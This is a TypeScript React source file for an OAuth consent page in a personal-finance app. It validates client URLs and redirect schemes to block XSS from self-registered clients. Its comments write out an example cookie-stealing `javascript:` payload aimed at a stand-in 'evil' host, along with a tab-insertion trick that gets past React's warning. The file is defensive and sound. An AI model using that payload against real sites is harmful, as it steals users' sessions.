import { isTrustedClientId } from "@cobalt-web/auth/trusted-clients";
import { env } from "@cobalt-web/env/web";
import { Alert, AlertDescription, AlertTitle } from "@cobalt-web/ui/components/alert";
import { Button } from "@cobalt-web/ui/components/button";
import { Separator } from "@cobalt-web/ui/components/separator";
import { Spinner } from "@cobalt-web/ui/components/spinner";
import { cn } from "@cobalt-web/ui/lib/utils";
import {
  Alert02Icon,
  CheckmarkCircle02Icon,
  SecurityCheckIcon,
  Tick02Icon,
} from "@hugeicons/core-free-icons";
import { HugeiconsIcon } from "@hugeicons/react";
import { useQuery } from "@tanstack/react-query";
import { createFileRoute, Link } from "@tanstack/react-router";
import { useCallback, useMemo, useState } from "react";
import type { ReactNode } from "react";

export const Route = createFileRoute("/oauth/consent")({
  component: RouteComponent,
  staticData: { title: "Authorize application" },
});

/**
 * Parses an attacker-controllable URL string and returns the canonical
 * `https:` form, or `null` if parsing fails or the scheme is anything else.
 *
 * OAuth dynamic client registration is open + unauthenticated (see
 * `packages/auth/src/index.ts`: `allowUnauthenticatedClientRegistration`).
 * Anyone on the internet can register a client with
 * `client_uri: "javascript:fetch('https://evil/x?c='+document.cookie)"`,
 * craft an `/oauth/consent?client_id=…` URL, and trick a victim into
 * clicking the rendered link — XSS in the `cobaltpf.com` origin with the
 * authenticated finance-API session. React does NOT sanitize `href`
 * attributes (the dev-only `javascript:` warning is a substring check
 * defeated by `java\tscript:`), so the React layer cannot be trusted to
 * filter these.
 *
 * Allow `https:` only. OAuth 2.1 §1.5 requires HTTPS for AS endpoints,
 * and the MCP 2025-11-25 spec requires HTTPS for `client_id` metadata
 * URLs under CIMD. There is no production case for a plaintext-`http:`
 * `client_uri` / `logo_uri` / `tos_uri` / `policy_uri`.
 */
function safeHttpsUrl(raw: string | null | undefined): string | null {
  if (!raw) {
    return null;
  }
  try {
    const u = new URL(raw);
    return u.protocol === "https:" ? u.href : null;
  } catch {
    return null;
  }
}

/** Better Auth returns `{ redirect, url }`; OpenAPI documents `redirect_uri`. */
function pickRedirectUrlFromConsentResponse(data: unknown): string | null {
  if (!data || typeof data !== "object") {
    return null;
  }
  const o = data as Record<string, unknown>;
  const top = o.redirect_uri ?? o.redirectUrl ?? o.url;
  if (typeof top === "string" && top.length > 0) {
    return top;
  }
  const inner = o.data;
  if (inner && typeof inner === "object") {
    const d = inner as Record<string, unknown>;
    const nested = d.redirect_uri ?? d.redirectUrl ?? d.url;
    if (typeof nested === "string" && nested.length > 0) {
      return nested;
    }
  }
  return null;
}

/**
 * Allowed schemes for post-consent redirect. `https:` covers web OAuth
 * clients; the custom schemes cover known MCP host applications that
 * register app-launch redirect URIs. Explicitly excludes `javascript:`,
 * `data:`, `vbscript:`, `file:` — `assign()` on any of those executes
 * script in the cobaltpf.com origin.
 *
 * `http:` is also allowed but **only** for loopback hosts (`localhost`,
 * `127.0.0.1`, `::1`) because RFC 8252 §7.3 requires localhost OAuth
 * loopback to use `http:` and MCP clients (Claude Code, Claude Desktop,
 * mcp-remote) register local redirect URIs this way.
 *
 * Custom schemes are added only after observing a real client use them.
 * Speculative schemes (`zed:`, `claude:`, `code:`) were removed because
 * we cannot confirm any production client registers them.
 */
const ALLOWED_REDIRECT_SCHEMES = new Set(["https:", "cursor:", "vscode:"]);

function isLocalhostHost(host: string): boolean {
  const [h] = host.toLowerCase().split(":");
  return h === "localhost" || h === "127.0.0.1" || h === "[::1]" || h === "::1";
}

function isAllowedRedirectUrl(raw: string): boolean {
  try {
    const u = new URL(raw);
    if (ALLOWED_REDIRECT_SCHEMES.has(u.protocol)) {
      return true;
    }
    if (u.protocol === "http:" && isLocalhostHost(u.host)) {
      return true;
    }
    return false;
  } catch {
    return false;
  }
}

/**
 * After `await fetch()`, user activation is gone; many browsers block
 * `window.location` to custom schemes (e.g. `cursor://`). We still try
 * assign/replace, and always show a same-document `<a href>` fallback.
 *
 * The URL ultimately derives from an OAuth client's registered redirect
 * URI. With unauthenticated dynamic client registration enabled
 * (`packages/auth/src/index.ts`), an attacker could register
 * `redirect_uri: "javascript:..."` and obtain XSS on Allow without the
 * victim clicking anything. Validate scheme defensively here even though
 * Better Auth should reject dangerous schemes at registration.
 */
function tryNavigateToClient(url: string): void {
  if (!isAllowedRedirectUrl(url)) {
    return;
  }
  try {
    window.location.assign(url);
  } catch {
    // ignore — fallback link below
  }
}

/**
 * Capabilities the access token grants. Tokens are not scoped — Allow = full
 * access to everything bound on the agent SDK. Kept in sync with `cobalt.*`
 * bindings in apps/server/src/ai/agents/finance-agent/bindings.ts.
 */
const COBALT_CAPABILITIES = [
  "Read your accounts, transactions, holdings, categories, and tags",
  "Create manual accounts and transactions",
  "Edit transaction categories, tags, and notes",
  "Create, edit, and delete tags",
] as const;

const COBALT_NEGATIVE_CAPABILITIES = [
  "Cannot move money or change account connections",
  "Cannot access your chats",
] as const;

interface PublicClient {
  client_id: string;
  client_name?: string | null;
  client_uri?: string | null;
  logo_uri?: string | null;
}

async function fetchPublicClient(clientId: string): Promise<PublicClient | null> {
  const url = new URL("/api/auth/oauth2/public-client", env.VITE_SERVER_URL);
  url.searchParams.set("client_id", clientId);
  const res = await fetch(url.href, { credentials: "include" });
  if (!res.ok) {
    return null;
  }
  return (await res.json()) as PublicClient;
}

function ClientCard({
  clientId,
  isPending,
  client,
}: {
  clientId: string;
  isPending: boolean;
  client: PublicClient | null;
}) {
  // Trust tier gates which fields render. Verified clients are pre-blessed
  // first-party apps (`packages/auth/src/trusted-clients.ts`). Untrusted =
  // anyone who self-registered via open DCR — we cannot trust their
  // client_name or logo for branding, so we render a generic icon and a
  // warning banner instead (SRI-340).
  const isVerified = isTrustedClientId(clientId);
  const displayName = client?.client_name?.trim() || clientId;
  const initial = displayName.slice(0, 1).toUpperCase();
  const safeLogo = isVerified ? safeHttpsUrl(client?.logo_uri) : null;
  // For verified clients we still show client_uri as a hostname (never a
  // clickable link). For unverified clients we drop it entirely — the
  // hostname is one of the strings an attacker controls at registration
  // time, so even displaying it as text aids brand impersonation.
  const clientHost = (() => {
    if (!isVerified) {
      return null;
    }
    const safe = safeHttpsUrl(client?.client_uri);
    if (!safe) {
      return null;
    }
    try {
      return new URL(safe).host;
    } catch {
      return null;
    }
  })();
  return (
    <div className="bg-muted/50 ring-foreground/10 flex items-center gap-3 rounded-lg p-3 ring-1">
      <div className="bg-background ring-foreground/10 flex size-9 shrink-0 items-center justify-center overflow-hidden rounded-md ring-1">
        {safeLogo ? (
          <img alt="" className="size-full object-cover" src={safeLogo} />
        ) : (
          <span className="font-medium text-sm">{initial}</span>
        )}
      </div>
      <div className="min-w-0 flex-1">
        <p className="text-muted-foreground text-xs">
          {isVerified ? "Verified application" : "Unverified application"}
        </p>
        {isPending ? (
          <p className="bg-muted h-4 w-32 animate-pulse rounded" />
        ) : (
          <p className="truncate font-medium text-sm">{displayName}</p>
        )}
        {clientHost ? (
          <p className="text-muted-foreground block truncate text-xs">{clientHost}</p>
        ) : null}
      </div>
    </div>
  );
}

function CapabilityList() {
  return (
    <div>
      <p className="text-muted-foreground mb-2 text-xs font-medium uppercase tracking-wide">
        Cobalt data
      </p>
      <ul className="space-y-2">
        {COBALT_CAPABILITIES.map((label) => (
          <li className="flex items-start gap-2 text-sm" key={label}>
            <HugeiconsIcon
              className="text-foreground/70 mt-0.5 shrink-0"
              icon={CheckmarkCircle02Icon}
              size={16}
            />
            <span className="min-w-0">{label}</span>
          </li>
        ))}
        {COBALT_NEGATIVE_CAPABILITIES.map((label) => (
          <li className="flex items-start gap-2 text-sm" key={label}>
            <HugeiconsIcon
              className="text-muted-foreground mt-0.5 shrink-0"
              icon={Alert02Icon}
              size={16}
            />
            <span className="text-muted-foreground min-w-0">{label}</span>
          </li>
        ))}
      </ul>
    </div>
  );
}

function RouteComponent() {
  const [status, setStatus] = useState<"idle" | "submitting" | "redirect" | "error">("idle");
  /** Which action is in flight — drives the post-click message before redirect. */
  const [pendingIntent, setPendingIntent] = useState<"allow" | "deny" | null>(null);
  /** Set when consent API succeeded; used for reliable `cursor://` handoff. */
  const [redirectUrl, setRedirectUrl] = useState<string | null>(null);
  const [completedIntent, setCompletedIntent] = useState<"allow" | "deny" | null>(null);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  const oauthQuery = useMemo(() => window.location.search.replace(/^\?/, ""), []);

  const clientId = useMemo(() => {
    const params = new URLSearchParams(window.location.search);
    return params.get("client_id");
  }, []);

  const clientQuery = useQuery({
    enabled: !!clientId,
    queryFn: () => fetchPublicClient(clientId as string),
    queryKey: ["oauth-public-client", clientId],
    staleTime: 5 * 60 * 1000,
  });
  const client = clientQuery.data ?? null;

  const postConsent = useCallback(
    async (accept: boolean) => {
      if (!oauthQuery) {
        setErrorMessage("Missing oauth query. Restart the sign-in flow.");
        setStatus("error");
        setPendingIntent(null);
        return;
      }
      setPendingIntent(accept ? "allow" : "deny");
      setStatus("submitting");
      setErrorMessage(null);
      setRedirectUrl(null);
      const url = new URL("/api/auth/oauth2/consent", env.VITE_SERVER_URL).href;
      let res: Response;
      try {
        res = await fetch(url, {
          body: JSON.stringify({ accept, oauth_query: oauthQuery }),
          credentials: "include",
          headers: { "Content-Type": "application/json" },
          method: "POST",
        });
      } catch {
        setErrorMessage(
          "Could not reach the server (network or CORS). Check that the API is running and CORS allows this origin.",
        );
        setStatus("error");
        setPendingIntent(null);
        return;
      }
      if (!res.ok) {
        setErrorMessage("Could not complete authorization. Try again.");
        setStatus("error");
        setPendingIntent(null);
        return;
      }
      let raw: unknown;
      try {
        raw = await res.json();
      } catch {
        setErrorMessage("Invalid response from server.");
        setStatus("error");
        setPendingIntent(null);
        return;
      }
      const next = pickRedirectUrlFromConsentResponse(raw);
      if (!next) {
        setErrorMessage("Unexpected response from server (no redirect URL).");
        setStatus("error");
        setPendingIntent(null);
        return;
      }
      setCompletedIntent(accept ? "allow" : "deny");
      setRedirectUrl(next);
      setStatus("redirect");
      setPendingIntent(null);
      tryNavigateToClient(next);
    },
    [oauthQuery],
  );

  const isAllowDone = status === "redirect" && completedIntent === "allow";
  const isDenyDone = status === "redirect" && completedIntent === "deny";
  const isDone = status === "redirect";
  const isSubmitting = status === "submitting";

  const allowButtonLabel = (): ReactNode => {
    if (isSubmitting && pendingIntent === "allow") {
      return (
        <>
          <Spinner className="size-4" />
          Authorizing…
        </>
      );
    }
    if (isAllowDone) {
      return (
        <>
          <HugeiconsIcon className="size-4" icon={Tick02Icon} />
          Authorized — return to your app
        </>
      );
    }
    return "Allow access";
  };

  return (
    <div className="flex min-h-0 flex-1 flex-col">
      <header className="bg-background flex h-14 shrink-0 items-center border-b px-4 lg:px-6">
        <Link className="text-base font-medium" to="/">
          Cobalt
        </Link>
      </header>
      <main className="flex min-h-0 flex-1 flex-col items-center justify-center overflow-auto p-4 sm:p-6">
        <div className="w-full max-w-md space-y-6">
          <div className="flex flex-col items-center text-center">
            <div className="bg-foreground/5 ring-foreground/10 mx-auto flex size-12 items-center justify-center rounded-full ring-1">
              <HugeiconsIcon className="text-foreground" icon={SecurityCheckIcon} size={24} />
            </div>
            <h1 className="mt-3 font-semibold text-lg">Authorize access to Cobalt</h1>
            <p className="text-muted-foreground mt-1 text-sm">
              An external application wants to connect to your Cobalt account. Only continue if you
              started this request from a trusted tool.
            </p>
          </div>

          <div className="space-y-4">
            {clientId ? (
              <ClientCard client={client} clientId={clientId} isPending={clientQuery.isPending} />
            ) : null}

            {clientId && !isTrustedClientId(clientId) ? (
              <Alert variant="destructive">
                <HugeiconsIcon icon={Alert02Icon} size={16} />
                <AlertTitle>Unverified application</AlertTitle>
                <AlertDescription>
                  This app registered itself with Cobalt and has not been verified by us. Its name,
                  logo, and website may be misleading. Only continue if you initiated this request
                  from a tool you trust.
                </AlertDescription>
              </Alert>
            ) : null}

            <CapabilityList />

            <Separator />

            <Alert>
              <HugeiconsIcon icon={Alert02Icon} size={16} />
              <AlertTitle>Only allow trusted applications</AlertTitle>
              <AlertDescription>
                You can revoke access at any time from your Cobalt settings.
              </AlertDescription>
            </Alert>

            {oauthQuery ? null : <p className="text-destructive text-sm">Missing oauth query.</p>}
            {errorMessage ? <p className="text-destructive text-sm">{errorMessage}</p> : null}
            {isDenyDone ? (
              <p className="text-muted-foreground text-sm">
                Access denied. You can close this window.
              </p>
            ) : null}
          </div>

          <div className="flex flex-col-reverse gap-2 sm:flex-row sm:justify-end">
            {isDone ? null : (
              <Button
                className="w-full sm:w-auto"
                disabled={!oauthQuery || isSubmitting}
                onClick={async () => {
                  await postConsent(false);
                }}
                type="button"
                variant="outline"
              >
                {isSubmitting && pendingIntent === "deny" ? (
                  <>
                    <Spinner className="size-4" />
                    Denying…
                  </>
                ) : (
                  "Deny"
                )}
              </Button>
            )}
            <Button
              className={cn(
                "w-full sm:w-auto",
                isAllowDone && "bg-green-600 hover:bg-green-600 pointer-events-none",
              )}
              disabled={!oauthQuery || isSubmitting || isDenyDone}
              onClick={async () => {
                await postConsent(true);
              }}
              type="button"
            >
              {allowButtonLabel()}
            </Button>
          </div>

          {isAllowDone && redirectUrl && isAllowedRedirectUrl(redirectUrl) ? (
            <p className="text-muted-foreground text-center text-xs">
              If your app did not open automatically,{" "}
              <a
                className="underline underline-offset-4"
                href={redirectUrl}
                rel="noreferrer noopener"
              >
                click here to return to it
              </a>
              .
            </p>
          ) : null}

          <p className="text-muted-foreground text-center text-xs">
            By continuing you agree to our{" "}
            <Link className="underline underline-offset-4" to="/terms">
              Terms
            </Link>{" "}
            and{" "}
            <Link className="underline underline-offset-4" to="/privacy">
              Privacy Policy
            </Link>
            .
          </p>
        </div>
      </main>
    </div>
  );
}
